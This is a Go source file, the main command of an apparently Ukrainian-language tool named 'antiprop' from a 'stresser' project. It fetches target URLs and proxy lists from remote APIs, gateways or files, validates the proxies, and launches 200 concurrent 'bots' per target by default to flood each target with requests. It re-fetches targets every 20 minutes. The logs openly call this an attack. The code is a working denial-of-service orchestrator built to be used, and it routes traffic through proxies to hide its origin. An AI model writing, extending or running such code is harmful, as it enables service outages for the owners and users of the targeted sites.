package cmd

import (
	"context"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/meddion/stresser/pkg/flood"
)

var (
	rootCmd     *cobra.Command
	gateway     string
	src         string
	srcFile     string
	sites       string
	proxy       string
	apiVersion  int
	botsNum     int
	maxErrCount int
	refreshTime int
	checkProxy  bool
	onlyProxy   bool
	verbose     bool
	dnsResolve  bool
)

func init() {
	rootCmd = &cobra.Command{
		Use:   "antiprop",
		Short: "Надсилає багато запитів на обрані цілі.\nЦілі та проксі отримуєм через джерела (API, файл)",
		Args:  cobra.MinimumNArgs(0),
		Run:   run,
	}
	rootCmd.PersistentFlags().IntVar(&botsNum, "bots", 200, "кількість ботів (активних з'єднань)")
	rootCmd.PersistentFlags().IntVar(&maxErrCount, "errcount", 100, "к-сть помилок на бота, щоб той закінчив роботу")
	// proxy
	rootCmd.PersistentFlags().StringVar(&proxy, "proxy", "", "proxy API URL")
	rootCmd.PersistentFlags().BoolVar(&onlyProxy, "onlyproxy", false, "з'єднання тільки через проксі")
	rootCmd.PersistentFlags().BoolVar(&checkProxy, "checkproxy", true, "validates proxy")
	// sources
	rootCmd.PersistentFlags().StringVar(&sites, "sites", "", "sites API URL")
	rootCmd.PersistentFlags().StringVar(&srcFile, "file", "", "файл із цілями та проксі")
	rootCmd.PersistentFlags().StringVar(
		&gateway,
		"gateway",
		"",
		"адреса, що повертає списки джерела для атаки",
	)
	rootCmd.PersistentFlags().StringVar(
		&src,
		"src",
		"",
		"джерело. адреса з якої отримати дані про атаку",
	)
	rootCmd.PersistentFlags().IntVar(
		&apiVersion,
		"api",
		2,
		"версія API джерела; досутпні версії: 1, 2",
	)

	// rootCmd.PersistentFlags().BoolVar(
	// 	&verbose,
	// 	"verbose",
	// 	true,
	// 	"be verbose in printing",
	// )
	rootCmd.PersistentFlags().BoolVar(
		&dnsResolve,
		"dnsres",
		true,
		"resolve dns before attack",
	)

	rootCmd.PersistentFlags().IntVar(
		&refreshTime,
		"refresh",
		20,
		"refresh time in minutes",
	)
}

func Execute() {
	rootCmd.Execute()
}

func run(cmd *cobra.Command, args []string) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Shutdown signal
	rootCtx, termProg := context.WithCancel(context.Background())
	startOsSignalHandler(termProg)

	epoch := 0
	for {
		epoch++
		epochCtx, termEpoh := context.WithTimeout(rootCtx, time.Minute*time.Duration(refreshTime))

		select {
		case <-rootCtx.Done():
			termEpoh()
			return
		default:
		}

		var (
			targets []flood.Target
			proxies []flood.Proxy
			err     error
		)

		log.Infof("Готуюся до атаки :) Сесія: %d \n", epoch)
		switch {
		// Get data from a file
		case srcFile != "":
			targets, proxies, err = flood.GetTargetDataFromFile(epochCtx, srcFile, apiVersion)
			if err != nil {
				log.Fatalf("Не вдалося прочитати вміст файлу '%s': %v", srcFile, err)
			}
		// Get targets (no proxy) from args
		case len(args) > 0:
			targets = make([]flood.Target, 0, len(args))
			for _, arg := range args {
				targets = append(targets, flood.Target{URL: arg})
			}
		// Get data from API APIv1/APIv2
		default:
			if src == "" && gateway != "" {
				log.Infof("Обраний гейтвей: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", sites)
				src, err = flood.GetSrcFromGateway(epochCtx, gateway)
				if err != nil {
					log.Errorf("Отримуючи списки джерел: %v", err)
					continue
				}
			}

			if src != "" {
				log.Infof("Обране джерело: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", src)

				targets, proxies, err = flood.GetTargetData(epochCtx, src, apiVersion)
				if err != nil {
					log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
					continue
				}

				log.Infoln("Дані із джерела підвантажено.")
			}
		}

		var validSources []string
		// Add targets from sources
		if sites != "" {
			for _, tSrc := range strings.Split(sites, ",") {
				tSrc = strings.Trim(tSrc, " ")
				if tSrc == "" {
					continue
				}
				log.Infof("Обране джерело для цілей: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", sites)
				ts, err := flood.GetTargets(epochCtx, sites)
				if err != nil {
					log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
					continue
				}

				validSources = append(validSources, tSrc)
				targets = append(targets, ts...)
				log.Infoln("Дані із джерела підвантажено.")
			}
		}

		// Add proxy from sources
		if proxy != "" {
			for _, pSrc := range strings.Split(proxy, ",") {
				pSrc = strings.Trim(pSrc, " ")
				if pSrc == "" {
					continue
				}
				log.Infof("Обране джерело для проксі: %s (ПЕРЕВІРТЕ НА ДОСТОВІРНІСТЬ)", pSrc)
				p, err := flood.GetProxy(epochCtx, pSrc)
				if err != nil {
					log.Errorf("Не вдалося отримати коректні дані від проксі джерела %s: %v", pSrc, err)
					continue
				}

				validSources = append(validSources, pSrc)
				proxies = append(proxies, p...)
				log.Infoln("Дані із джерела проксі підвантажено.")
			}

		}

		// Proxy Validation
		if checkProxy {
			log.Infof("Приступаю до валідації проксі, надсилаючи запит на: %s", flood.TEST_PROXY_SITE)
			validProxies := flood.ValidateProxy(epochCtx, proxies)
			if len(validProxies) > 0 {
				log.Infoln("Знайдено валідних проксі: %d\n", len(validProxies))
				for i, proxy := range validProxies {
					log.Printf("%d) %s\n", i+1, proxy.IP)
				}
				proxies = validProxies
			} else {
				log.Infoln("Проксі не знайдено")
				if onlyProxy {
					log.Fatalln("Не можу продовжити")
				}
			}
		}

		// Targets Validation
		log.Infoln("Приступаю до валідації цілей...")
		validTargets := flood.ValidateTargets(epochCtx, targets, dnsResolve)
		if len(validTargets) == 0 {
			log.Infoln("Цілей не знайдено")
			continue
		}
		log.Infoln("Знайдено цілей:")
		for i, target := range validTargets {
			log.Printf("%d) %s\n", i+1, target.URL)
		}

		go func() {
			changeTracker := make(chan string)
			go flood.SourceContentTracker(epochCtx, validSources, changeTracker)

			select {
			case <-epochCtx.Done():
			case src := <-changeTracker:
				log.Infof("Вміст джерела %s змінено. Готуюся до нової сесії.", src)
				termEpoh()
			}
		}()

		var wg sync.WaitGroup
		wg.Add(len(validTargets))
		for _, target := range validTargets {
			go func(target flood.Target) {
				defer wg.Done()

				botSched := flood.NewBotScheduler(target, proxies, botsNum, maxErrCount, onlyProxy)
				if err := botSched.Start(epochCtx); err != nil {
					log.Errorf("Не вдалося запустити ботів: %v\n", err)
				} else {
					log.Infof("Припиняю надсилати запити до %s", target.URL)
				}
			}(target)
		}

		wg.Wait()
		termEpoh()
	}
}

func startOsSignalHandler(terminate func()) {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigs
		terminate()
		log.Infoln("Готуюся до закриття.")
	}()
}
